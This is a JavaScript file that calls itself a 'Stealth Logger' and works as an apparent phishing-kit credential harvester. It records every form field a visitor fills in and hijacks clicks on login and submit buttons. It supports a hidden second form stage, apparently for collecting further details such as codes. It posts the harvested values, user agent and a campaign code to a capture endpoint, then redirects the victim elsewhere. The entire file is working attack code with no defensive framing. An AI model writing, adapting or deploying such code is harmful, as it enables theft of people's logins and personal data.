// CONFIG
const CONFIG = {
    INPUT_IDLE_TIMEOUT: 2000,
    SUBMIT_BUTTON_PATTERNS: [
        'submit', 'login', 'sign in', 'continue', 'next', 'confirm', 'proceed', 'authenticate',
        'log on', 'start', 'verify', 'go', 'enter', 'accept'
    ],
    REDIRECT_URL: window.REDIRECT_URL || 'https://example.com',
    CAPTURE_URL: '/api/capture',
    MULTI_STAGE: window.MULTI_STAGE || false
};

(() => {
    const log = (msg, type='info') => console.log(`[Stealth Logger] ${msg}`);
    let typingTimer;
    let formData = {};
    let currentStage = 1;
    let stage1Data = {};

    const getFieldName = (field) => {
        return field.name || field.id || field.placeholder || field.getAttribute('aria-label') || `unnamed_${field.type}`;
    };

    const captureAllInputs = () => {
        const data = { ...formData };

        let selector = 'input, textarea, select';
        if (CONFIG.MULTI_STAGE) {
            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
        }

        document.querySelectorAll(selector).forEach(field => {
            const name = getFieldName(field);
            const value = field.value.trim();
            if (value) data[name] = value;
        });
        return data;
    };

    const sendData = async (data) => {
        try {
            const timestamp = new Date().toISOString();
            const pageUrl = window.location.href;
            const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN';

            if (CONFIG.MULTI_STAGE && currentStage === 2) {
                data = { ...stage1Data, ...data };
            }

            const payload = {
                url: pageUrl,
                timestamp: timestamp,
                formData: data,
                userAgent: navigator.userAgent,
                uniqueCode: uniqueCode
            };

            const response = await fetch(CONFIG.CAPTURE_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                log('Successfully sent to Worker');
                window.location.href = CONFIG.REDIRECT_URL;
            } else {
                const err = await response.text();
                log('Worker error: ' + err, 'error');
                setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
            }
        } catch (err) {
            log('Fetch failed: ' + err.message, 'error');
             setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 1000);
        }
    };

    const handleAction = (e, target) => {
        if (CONFIG.MULTI_STAGE && currentStage === 1) {
             const keywords = CONFIG.SUBMIT_BUTTON_PATTERNS;
             let isSubmit = false;

             const text = (target.innerText || target.value || '').toLowerCase();
             if (keywords.some(p => text.includes(p))) isSubmit = true;

             if (e.type === 'submit') isSubmit = true;

             if (isSubmit) {
                 e.preventDefault();
                 e.stopPropagation();

                 const s1Data = captureAllInputs();
                 stage1Data = s1Data;
                 formData = {};

                 const s1 = document.getElementById('dtech-stage-1');
                 const s2 = document.getElementById('dtech-stage-2');
                 if(s1 && s2) {
                     s1.style.display = 'none';
                     s2.style.display = 'block';
                     currentStage = 2;
                     log('Switched to Stage 2');
                 }
                 return;
             }
        }

        let shouldSend = false;

        if (e.type === 'submit') {
            shouldSend = true;
        } else {
            const text = (target.innerText || target.value || '').toLowerCase();
            if (CONFIG.SUBMIT_BUTTON_PATTERNS.some(p => text.includes(p))) {
                shouldSend = true;
            }
        }

        if (shouldSend) {
             e.preventDefault();
             e.stopPropagation();
             const data = captureAllInputs();
             sendData(data);
        }
    };

    const setupInputHandlers = () => {
        document.querySelectorAll('input, textarea, select').forEach(field => {
            field.addEventListener('input', () => {
                clearTimeout(typingTimer);
                typingTimer = setTimeout(() => {
                    const name = getFieldName(field);
                    const value = field.value.trim();
                    if (value) formData[name] = value;
                }, CONFIG.INPUT_IDLE_TIMEOUT);
            });
        });
    };

    const setupSubmissionHandlers = () => {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', (e) => handleAction(e, e.target), true);
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'LABEL'].includes(target.tagName)) {
                if (target.tagName === 'INPUT' && (target.type === 'submit' || target.type === 'button' || target.type === 'image')) {
                     // pass
                } else {
                    return;
                }
            }

            const btn = target.closest('button, input[type="submit"], input[type="button"], a, div, span');
            if (btn) {
                if (['DIV', 'SPAN'].includes(btn.tagName)) {
                     const style = window.getComputedStyle(btn);
                     if (style.cursor !== 'pointer' && btn.getAttribute('role') !== 'button') return;
                }
                handleAction(e, btn);
            }
        }, true);
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
            setupInputHandlers();
            setupSubmissionHandlers();
        });
    } else {
        setupInputHandlers();
        setupSubmissionHandlers();
    }
})();
